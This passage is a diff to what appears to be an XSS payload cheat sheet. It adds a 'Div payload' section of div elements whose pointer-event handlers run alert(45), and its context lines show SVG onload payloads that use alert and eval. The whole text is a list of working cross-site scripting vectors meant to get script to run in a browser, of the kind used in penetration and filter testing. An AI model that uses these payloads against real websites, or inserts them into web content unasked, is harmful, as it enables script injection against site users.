@@ -141,6 +141,15 @@ Svg payload
 <svg id=alert(1) onload=eval(id)>
 "><svg/onload=alert(String.fromCharCode(88,83,83))>
 "><svg/onload=alert(/XSS/)
+
+Div payload
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
 ```
 
 XSS for HTML5
